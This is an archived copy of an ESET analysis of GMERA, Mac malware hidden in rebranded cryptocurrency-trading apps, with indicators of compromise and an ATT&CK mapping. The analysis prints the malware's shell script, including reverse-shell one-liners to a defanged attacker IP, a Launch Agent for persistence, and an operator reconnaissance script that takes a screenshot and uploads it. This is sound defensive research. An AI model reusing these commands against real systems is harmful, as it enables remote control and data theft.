{
    "id": "3eb8834b-295f-40ed-9a23-27af1b816abe",
    "created_at": "2023-01-12T15:09:32.183321Z",
    "updated_at": "2025-03-27T02:05:26.995571Z",
    "deleted_at": null,
    "sha1_hash": "ea2c13926f1962928d647b1629801662a2714089",
    "title": "2020-07-16 - Mac cryptocurrency trading application rebranded, bundled with malware",
    "authors": "",
    "file_creation_date": "2022-05-28T16:10:48Z",
    "file_modification_date": "2022-05-28T16:10:48Z",
    "file_size": 556944,
    "plain_text": "# Mac cryptocurrency trading application rebranded, bundled with malware\n\n**[welivesecurity.com/2020/07/16/mac-cryptocurrency-trading-application-rebranded-bundled-malware/](https://www.welivesecurity.com/2020/07/16/mac-cryptocurrency-trading-application-rebranded-bundled-malware/)**\n\nJuly 16, 2020\n\nESET researchers lure GMERA malware operators to remotely control their Mac honeypots\n\n[Marc-Etienne M.Léveillé](https://www.welivesecurity.com/author/marc-etienne/)\n16 Jul 2020 - 11:30AM\n\nESET researchers lure GMERA malware operators to remotely control their Mac honeypots\n\nWe’ve recently discovered websites distributing malicious cryptocurrency trading applications for Mac. This malware is used\nto steal information such as browser cookies, cryptocurrency wallets and screen captures. Analyzing the malware samples,\nwe quickly found that this was a new campaign of what Trend Micro researchers called GMERA, in an analysis they\npublished in September 2019. As in the previous campaigns, the malware reports to a C&C server over HTTP and\nconnects remote terminal sessions to another C&C server using a hardcoded IP address. This time, however, not only did\nthe malware authors wrap the original, legitimate application to include malware; they also rebranded the Kattana trading\n\n\n-----\n\napplication with new names and copied its original website. We have seen the following fictitious brandings used in different\ncampaigns: Cointrazer, Cupatrade, Licatrade and Trezarus. In addition to the analysis of the malware code, ESET\nresearchers have also set up honeypots to try to reveal the motivations behind this group of criminals.\n\n## Distribution\n\nWe have not yet been able to find exactly where these trojanized applications are promoted. However, in March 2020,\nKattana [posted a warning suggesting that victims were approached individually to lure them into downloading a trojanized](https://twitter.com/kattanatrade/status/1238051414745722880)\napp. We couldn’t confirm that it was linked to this particular campaign, but it could very well be the case.\n\n_Figure 1. Kattana warns about trojanized copies of their software on Twitter_\n\nCopycat websites are set up to make the bogus application download look legitimate. For a person who doesn’t know\nKattana, the websites do look legitimate.\n\n\n-----\n\n_Figure 2. Original (legitimate) Kattana website_\n\n\n-----\n\n_Figure 3. Malicious Licatrade website with download link to malware_\n\nThe download button on the bogus sites is a link to a ZIP archive containing the trojanized application bundle.\n\n## Analysis\n\nMalware analysis in this case is pretty straightforward. We will take the Licatrade sample as the example here. Other\nsamples have minor differences, but the ideas and functionalities are essentially the same. Similar analyses of earlier\nGMERA campaigns are provided in Trend Micro’s [blogpost and in Objective-See’s](https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/) [Mac malware of 2019 report.](https://objective-see.com/blog/blog_0x53.html)\n\n\n-----\n\n_Figure 4. Content of the Licatrade application bundle_\n\nModification timestamps of the files in the ZIP archive, the date the application was signed, and the Last‑Modified HTTP\nheader when we downloaded the archive all show April 15, 2020. This is highly suggestive that this campaign started onth\nthat date.\n\nA shell script (run.sh) is included in the resources of the application bundle. This main executable, written in Swift, launches\nrun.sh. For some reason, the malware author has duplicated functionality to send a simple report to a C&C server over\nHTTP, and to connect to a remote host via TCP providing a remote shell to the attackers, in both the main executable and\nthe shell script. An additional functionality, in the shell script only, is to set up persistence by installing a Launch Agent.\n\nHere is the full shell script source (ellipsis in long string and defanged):\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n\n#! /bin/bash\n\nfunction remove_spec_char(){\n\necho \"$1\" | tr -dc '[:alnum:].\\r' | tr '[:upper:]' '[:lower:]'\n\n}\n\nwhoami=\"$(remove_spec_char `whoami`)\"\n\nip=\"$(remove_spec_char `curl -s ipecho.net/plain`)\"\n\nreq=`curl -ks \"http://stepbystepby[.]com/link.php?${whoami}&${ip}\"`\n\nplist_text=\"ZWNobyAnc2R2a21…d2Vpdm5laXZuZSc=\"\n\necho \"$plist_text\" | base64 --decode > \"/tmp/.com.apple.system.plist\"\n\ncp \"/tmp/.com.apple.system.plist\" \"$HOME/Library/LaunchAgents/.com.apple.system.plist\"\n\nlaunchctl load \"/tmp/.com.apple.system.plist\"\n\nscre=`screen -d -m bash -c 'bash -i >/dev/tcp/193.37.212[.]97/25733 0>&1'`\n\n\nIt’s interesting to note that persistence is broken in the Licatrade sample: the content of the resulting Launch Agent file\n(.com.apple.system.plist) isn’t in Property List format as [launchd expects, but instead is the command line to be executed.](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/TP40001762-104142)\n\nThe decoded content (ellipses in long strings) of the $plist_text variable is:\n\n1 echo 'sdvkmsdfmsd…kxweivneivne'; while :; do sleep 10000; screen -X quit; lsof -ti :25733 | xargs kill -9; screen -d -m\nbash -c 'bash -i >/dev/tcp/193.37.212[.]97/25733 0>&1'; done; echo 'sdvkmsdfmsdfms…nicvmdskxweivneivne'\n\nIf run directly, this code would open a reverse shell from the victim machine to an attacker-controlled server, but that fails\nhere. Fortunately for the attackers, the last line of the shell script also starts a reverse shell to their server.\n\nThe Cointrazer sample, used in campaigns prior to Licatrade, does not suffer from this issue: the Launch Agent is installed\nand successfully starts when the user logs in.\n\nThe various reverse shells used by these malware operators connect to different remote ports depending on how they were\nstarted. All connections are unencrypted. Here is a list of ports, based on the Licatrade sample.\n\n**TCP Port** **Where** **How**\n\n**25733** Licatrade executable zsh in screen using ztcp\n\nrun.sh bash in screen using /dev/tcp\n\nLaunch Agent (Not working) bash in screen using /dev/tcp\n\n**25734** Licatrade executable zsh using ztcp\n\n**25735** Licatrade executable bash using /dev/tcp\n\n**25736** Licatrade executable bash in screen using /dev/tcp\n\n**25737** Licatrade executable bash in screen using /dev/tcp\n\n**25738** Licatrade executable zsh in screen using ztcp\n\n\n-----\n\nHere are some example command lines used:\n\nBash in screen using /dev/tcp:\n\nscreen -d -m bash -c ‘bash -i >/dev/tcp/193.37.212[.]97/25733 0>&1’\n\nzsh using ztcp:\n\nzsh -c ‘zmodload zsh/net/tcp && ztcp 193.37.212[.]97 25734 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY’\n\nThe rebranded Kattana application is also in the resources of the application bundle. We wanted to see if, besides the\nchange in name and icon in the application, some other code was changed. Since Kattana asks for credentials for trading\nplatforms to perform trading, we verified if the input fields of these were tampered with and if credentials were exfiltrated in\nsome way. Kattana is built with [Electron, and Electron apps have an app.asar file, which is an archive containing the](https://www.electronjs.org/)\nJavaScript code of the application. We have checked all changes between the original Kattana application and the\nmalicious Licatrade copycat and found that only strings and images were changed.\n\n_Figure 5. Partial difference between Kattana and Licatrade_\n\nLicatrade and its resources were all signed using the same certificate, having the common name field set to Andrey\nNovoselov and using developer ID M8WVDT659T. The certificate was issued by Apple on April 6, 2020. It was revokedth\nthe same day we notified Apple about this malicious application.\n\n\n-----\n\n_Figure 6. Certificate used to sign Licatrade_\n\n\n-----\n\n_gu e_ _cat ade ce t cate_ _as e o ed_ _ay_ _8t,_ _0 0_\n\nFor each of the other campaigns we analyzed, a different certificate was used. Both were already revoked by Apple when\nwe started our analyses. See the IoCs section for details about these. It’s interesting to note that in the case of Cointrazer,\nthere were only 15 minutes between the moment the certificate was issued by Apple and the malefactors signing their\ntrojanized application. This, and the fact that we didn’t find anything else signed with the same key, suggests they got the\ncertificate explicitly for that purpose.\n\n## Infrastructure\n\nThe malicious Licatrade application was available on the licatrade.com website and its C&C HTTP report server domain is\nstepbystepby.com. Both domains were registered using the levistor777@gmail.com email address. Searching for other\ndomains registered with that email address reveals what looks like several previous campaigns. Here is a list of domains\nwe found in samples or registered with that email address.\n\n**Domain name** **Registration date** **Comment**\n\nrepbaerray.pw 2019-02-25 C&C server for HTTP report of Stockfolio app\n\nmacstockfolio.com 2019-03-03 Website distributing the malicious Stockfolio app\n\nlatinumtrade.com 2019-07-25 Website distributing the malicious Latinum app\n\ntrezarus.com 2019-06-03 Website distributing the malicious Trezarus app\n\ntrezarus.net 2019-08-07\n\ncointrazer.com 2019-08-18 Website distributing the malicious Cointrazer app\n\napperdenta.com 2019-08-18 Usage unknown\n\nnarudina.com 2019-09-23 Usage unknown\n\nnagsrsdfsudinasa.com 2019-10-09 C&C server for HTTP report of Cointrazer app\n\ncupatrade.com 2020-03-28 Website distributing the malicious Cupatrade app\n\nstepbystepby.com 2020-04-07 C&C server for HTTP report of Licatrade app\n\nlicatrade.com 2020-04-13 Website distributing the malicious Licatrade app\n\ncreditfinelor.com 2020-05-29 Empty page, usage unknown\n\nmaccatreck.com 2020-05-29 Some authentication form\n\nBoth the websites and HTTP C&C servers receiving the malware’s first report are hosted behind Cloudflare.\n\n## Honeypot interactions\n\nTo learn more about the intentions of this group, we set up honeypots where we monitored all interactions between the\nGMERA reverse shell backdoors and the operators of this malware.\n\nWe saw no C&C commands issued via the HTTP C&C server channel; everything happened through the reverse shells.\nWhen it first connected, the C&C server sent a small script to gather the username, the macOS version and location (based\non external IP address) of the compromised device.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n\n#! /bin/bash\n\nfunction check() {\n\nif [ ! -f /private/var/tmp/.i ]; then\n\nwrite\n\nelse\n\nif [ \"$(( $(date +\"%s\") - $(stat -f \"%m\" /private/var/tmp/.i) ))\" -gt \"21600\" ]; then\n\nwrite\n\nfi\n\nfi\n\n}\n\nfunction write() {\n\ngetit=`curl -s ipinfo.io | grep -e country -e city | sed 's/[^a-zA-Z0-9]//g' | sed -e \"s/city//g;s/country//g\"`\n\necho `whoami` > /private/var/tmp/.i\n\necho `sw_vers -productVersion` >> /private/var/tmp/.i\n\necho \"$getit\" >> /private/var/tmp/.i\n\n}\n\ncheck\n\ncat /private/var/tmp/.i\n\n\nwhich sent something like this to the operators:\n\n\n1\n\n2\n\n3\n\n4\n\n\njeremy\n\n10.13.4\n\nBratislava\n\nSK\n\n\nThe TCP connection stays open and waits for further commands. In our case, after a while, the operators manually\ninspected the machine. Across several of our honeypots, the commands used to perform that inspection varied. Part of it\nwas just listing files across the file system. Sometimes, they would copy-and-paste a base64-encoded script designed to list\ninformation to reveal whether the system is a honeypot or actually interesting. The script is decoded, then piped to bash.\n\n\n-----\n\n_Figure 8. Packet capture of the operator sending the base64-encoded secondary reconnaissance script_\n\nHere is the decoded script:\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n\necho \"\"\n\necho \"------ Whoami ------\"\n\nwhoami\n\necho \"------ IP info ------\"\n\ncurl -s ipinfo.io\n\necho \"------ Mac Model ------\"\n\ncurl -s https://support-sp.apple.com/sp/product?cc=$(system_profiler SPHardwareDataType | awk '/Serial/ {print $4}'\n| cut -c 9-) | sed 's|.*<configCode>\\(.*\\)</configCode>.*|\\1|'\n\necho \"------ MacOS Version ------\"\n\nsw_vers -productVersion\n\nsw_vers -productVersion | grep -E \"10.15.*\" && echo -e \"\\033[1;31m CATALINA CATALINA CATALINA CATALINA\nCATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA\nCATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA\nCATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA CATALINA\nCATALINA CATALINA CATALINA CATALINA \\033[0m\"\n\nsleep 1\n\necho \"------ MacOS Installed ------\"\n\ndate -r /var/db/.AppleSetupDone\n\necho \"------ Disks ------\"\n\n\n-----\n\n8\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n\nd\n\necho \"------ Video Output ------\"\n\nsystem_profiler SPDisplaysDataType\n\necho \"------ Wifi Around ------\"\n\n/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s\n\necho \"------ Virtual Mashine Detector ------\"\n\nioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -E \"irtual|racle|ware|arallels\" || echo \"Probably not a Virtual\nMashine...\"\n\necho \"--------------------------------\"\n\necho \"------ Developer Detector ------\"\n\necho \"--------------------------------\"\n\necho \"||| Applications |||\"\n\nls -laht /Applications | grep -E \"Xcode|ublime|ourceTree|Atom|MAMP|TextWrangler|Code|ashcode\" && echo \"-|Be\nCarefull|-\"\n\necho \"||| Short Bash History |||\"\n\ncat ~/.bash_history | head -n 20\n\necho \"------ Desktop Screen ------\"\n\necho \"create screenshot...\"\n\nsw_vers -productVersion | grep -E \"10.15.*\" & screencapture -t jpg -x /tmp/screen.jpg &> /dev/null\n\nsips -z 500 800 /tmp/screen.jpg &> /dev/null\n\nsips -s formatOptions 50 /tmp/screen.jpg &> /dev/null\n\necho \"uploading...\"\n\ncurl -s -F \"file=@/tmp/screen.jpg\" https://file.io\n\n\n[This script is actually very similar of the plugin file found in one of the Stockfolio samples analyzed last year. However, in](https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/)\nthe more recent campaigns, they chose to send the reconnaissance script over the network to interesting victims only. It\nwas also updated to include some additional information.\n\n\n-----\n\n_Figure 9. Report output that would be seen on an operator’s terminal (reconstructed from packet capture)_\n\nWe’ll go over each section of the script here:\n\nIt gets the full report about the external IP from ipinfo.io\nIt checks for Mac model by using the last 4 digits of the Mac serial number and an HTTP service provided by Apple to\ntranslate it to a friendly name such as “MacBook Pro (Retina, 15-inch, Late 2013)”. Virtual machines likely have invalid\nserial numbers and may not display a model here.\nIt outputs the version of macOS installed. There is a rather big red (using ANSI escape sequence), all caps warning\nwhen the computer is running macOS Catalina (10.15). We think we understand why and talk about it later.\nIt checks when macOS was installed using the modification time of the /var/db/.AppleSetupDone.\nIt outputs the disk usage and connected monitors’ details.\nIt lists available Wi-Fi networks. Honeypots are likely to have Wi-Fi disabled.\nIt detects whether the computer is a VMware, Parallels or VirtualBox virtual machine by looking at the vendor strings\nof connected devices.\nIt checks whether common text editors or IDE applications are installed and warns operators to “Be Carefull” (sic)\nbecause this victim could be more computer savvy than usual.\nIt gets the first (i.e. oldest) 20 commands from the bash history file.\nFinally, it takes a screenshot, resizes it and uploads it to file.io. It checks to see whether the system is running macOS\nCatalina before doing so, but an error in the script makes this check useless. The “&” control operator, which starts\ncommands in parallel, is used instead of the logical AND (“&&”) operator. This means the screen capture is taken\nregardless of the macOS version.\n\nThe fact that a screenshot should not be taken on Catalina and that an obvious warning sign will be displayed on the\noperator’s terminal made us wonder why they act differently on the current macOS version. It turns out that Catalina added\n[a feature where recording the screen or taking a screenshot must be approved by the user for each application. We tested](https://support.apple.com/guide/mac-help/control-access-to-screen-recording-on-mac-mchld6aa7d23/)\ntaking a screenshot from the reverse shell on Catalina and ended up with the following warning in our sandbox, which is\nrather suspicious considering a trading application has no business doing so.\n\n\n-----\n\n_Figure 10. macOS Catalina warning should the operators try taking a screenshot_\n\nShould a compromised system be considered interesting, the exfiltration phase begins. Interesting files are compressed\ninto a ZIP archive and uploaded via HTTP to yet another server, also under the control of the attackers.\n\n_Figure 11. Packet capture of an operator using the reverse shell to exfiltrate browser cookies_\n\nIt’s funny to note here the /tmp/h.zip file did not exist. Perhaps they copy-and-pasted some command that was used for\nanother victim.\n\nBased on the activity we have witnessed, we conclude that some of the interests of the operators of this malware are:\n\nBrowser information (cookies, history)\nCryptocurrency wallets\nScreen captures\n\n## Conclusion\n\nThe numerous campaigns run by this group show how much effort they’ve expended over the last year to compromise Mac\nusers doing online trading. We still aren’t sure how someone becomes a victim, downloading one of the trojanized\napplications, but the hypothesis of the operators directly contacting their targets and socially engineering them into installing\nthe malicious application seems the most plausible.\n\n\n-----\n\nIt is interesting to note how the malware operation is more limited on the most recent version macOS. We did not see the\noperators try to circumvent the limitation surrounding screen captures. Further, we believe that the only way that they could\nsee the computer screen on victim machines running Catalina would be to exfiltrate existing screenshots taken by the\nvictim. This is a good, real-world example of a mitigation implementation in the operating system that has worked to limit the\nactivities of malefactors.\n\n## Indicators of Compromise (IoCs)\n\n### Samples\n\n\n**SHA-1** **Filename**\n\n\n**ESET**\n**detection**\n**name**\n\n\n2AC42D9A11B67E8AF7B610AA59AADCF1BD5EDE3B Licatrade.zip multiple\nthreats\n\n560071EF47FE5417FFF62CB5C0E33B0757D197FA Licatrade.app/Contents/Resources/run.sh OSX/Agent.BA\n\n4C688493958CC7CCCFCB246E706184DD7E2049CE Licatrade.app/Contents/MacOS/Licatrade OSX/Agent.BA\n\n9C0D839D1F3DA0577A123531E5B4503587D62229 Cointrazer.zip multiple\nthreats\n\nDA1FDA04D4149EBF93756BCEF758EB860D0791B0 Cointrazer.app/Contents/Resources/nytyntrun.sh OSX/Agent.AZ\n\nF6CD98A16E8CC2DD3CA1592D9911489BB20D1380 Cointrazer.app/Contents/MacOS/Cointrazer OSX/Agent.BA\n\n575A43504F79297CBFA900B55C12DC83C2819B46 Stockfolio.zip multiple\nthreats\n\nB8F19B02F9218A8DD803DA1F8650195833057E2C Stockfolio.app/Contents/MacOS/Stockfoli OSX/Agent.AZ\n\nAF65B1A945B517C4D8BAAA706AA19237F036F023 Stockfolio.app/Contents/Resources/run.sh OSX/Agent.AZ\n\n### Code signing certificate\n\n\n**Revoked**\n**on**\n\n2019-0726\n\n2020-0416\n\n2020-0528\n\n\n**App**\n**name** **Fingerprint (SHA-1)** **Developer identity**\n\nStockfolio E5D2C7FB4A64EAF444728E5C61F576FF178C5EBF Levis Toretto\n(9T4J9V8NV5)\n\nCointrazer 1BC8EA284F9CE5F5F68C68531A410BCC1CE54A55 Andrei Sobolev\n(A265HSB92F)\n\nLicatrade BDBD92BFF8E349452B07E5F1D2883678658404A3 Andrey Novoselov\n(M8WVDT659T)\n\n### Network\n\n**Domain names**\n\n- repbaerray.pw\n\n- macstockfolio.com\n\n- latinumtrade.com\n\n- trezarus.com\n\n- trezarus.net\n\n- cointrazer.com\n\n- apperdenta.com\n\n- narudina.com\n\n\n**Valid**\n**from**\n\n201811-25\n\n201910-17\n\n202004-06\n\n\n**App**\n**signed**\n**on**\n\n201904-18\n\n201910-17\n\n202004-15\n\n\n-----\n\nnagsrsdfsudinasa.com\n\n- cupatrade.com\n\n- stepbystepby.com\n\n- licatrade.com\n\n- creditfinelor.com\n\n- maccatreck.com\n\n### IP addresses\n\n- 85.209.88.123\n\n- 85.217.171.87\n\n- 193.37.214.7\n\n- 193.37.212.97\n\n### Host-based indicators\n\n**File paths**\n\n- $HOME/Library/LaunchAgents/.com.apple.upd.plist\n\n- $HOME/Library/LaunchAgents/.com.apple.system.plist\n\n- /tmp/.fil.sh\n\n- /tmp/loglog\n\n**Launch Agent labels**\n\n- com.apple.apps.upd\n\n- com.apples.apps.upd\n\n## MITRE ATT&CK techniques\n\n[Note: This table was built using version 6 of the ATT&CK framework.](https://attack.mitre.org/resources/versions/)\n\n**Tactic** **ID** **Name** **Description**\n\nExecution [T1204](https://attack.mitre.org/techniques/T1204/) User Execution Victim needs to run the malicious\napplication to be compromised.\n\n\n[T1059](https://attack.mitre.org/techniques/T1059/) Command-Line\nInterface\n\n\nGMERA provides reverse bash and zsh\nshells to its operators.\n\n\nPersistence [T1159](https://attack.mitre.org/techniques/T1159/) Launch Agent GMERA installs a Launch Agent to\nmaintain persistence.\n\n\nDefense\nEvasion\n\nCredential\nAccess\n\n\n[T1116](https://attack.mitre.org/techniques/T1116/) Code Signing All samples of GMERA we have\nanalyzed were signed and used\nvalid, Apple-signed (now revoked),\ncertificates.\n\n[T1139](https://attack.mitre.org/techniques/T1139/) Bash History A GMERA reconnaissance script lists\nthe first 20 lines of the .bash_history\nfile.\n\n\n[T1539](https://attack.mitre.org/techniques/T1539/) Steal Web Session\nCookie\n\n\nGMERA’s operators steal browser cookies\nvia a reverse shell.\n\n\nDiscovery [T1083](https://attack.mitre.org/techniques/T1083/) File and Directory Discovery GMERA’s operators list files on the\ntarget system via a reverse shell and\nls .\n\n\n[T1497](https://attack.mitre.org/techniques/T1497/) Virtualization/Sandbox\nEvasion\n\n\nA GMERA reconnaissance script checks\nfor devices specific to hypervisors and\nwarns the operators if run in a virtual\nmachine.\n\n\n-----\n\n**Tactic** **ID** **Name** **Description**\n\n[T1040](https://attack.mitre.org/techniques/T1040/) Network Sniffing A GMERA reconnaissance script lists WiFi networks available to the compromised\nMac using airport -s .\n\n\n[T1082](https://attack.mitre.org/techniques/T1082/) System Information\nDiscovery\n\n\nA GMERA reconnaissance script lists\ninformation about the system such as\nmacOS version, attached displays and\nMac model.\n\n\n[T1518](https://attack.mitre.org/techniques/T1518/) Software Discovery A GMERA reconnaissance script checks\nwhether developer tools are installed.\n\nCollection [T1005](https://attack.mitre.org/techniques/T1005/) Data from Local System GMERA’s operators use this malware\nto exfiltrate files from the\ncompromised system.\n\n[T1113](https://attack.mitre.org/techniques/T1113/) Screen Capture GMERA’s operators take screenshots of\nthe compromised system and exfiltrate\nthem through file.io.\n\n\nCommand\nand Control\n\n\n[T1043](https://attack.mitre.org/techniques/T1043/) Commonly Used Port Initial reporting from the malware is\ndone using HTTP on its standard\nTCP port (80).\n\n\n[T1065](https://attack.mitre.org/techniques/T1065/) Uncommonly Used\nPort\n\n\nGMERA reverse shells are opened by\nconnecting to C&C server TCP ports in\nthe range 25733 to 25738.\n\n\nExfiltration [T1048](https://attack.mitre.org/techniques/T1048/) Exfiltration Over Alternative Protocol GMERA exfiltrates files from the\nreverse shell using HTTP to another\nattacker-controlled server.\n\n16 Jul 2020 - 11:30AM\n\n### Sign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource Center\n\n Newsletter\n\n Discussion\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-07-16 - Mac cryptocurrency trading application rebranded, bundled with malware.pdf"
    ],
    "report_names": [
        "2020-07-16 - Mac cryptocurrency trading application rebranded, bundled with malware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536172,
    "ts_updated_at": 1743041126,
    "ts_creation_date": 1653754248,
    "ts_modification_date": 1653754248,
    "files": {
        "pdf": "https://archive.orkl.eu/ea2c13926f1962928d647b1629801662a2714089.pdf",
        "text": "https://archive.orkl.eu/ea2c13926f1962928d647b1629801662a2714089.txt",
        "img": "https://archive.orkl.eu/ea2c13926f1962928d647b1629801662a2714089.jpg"
    }
}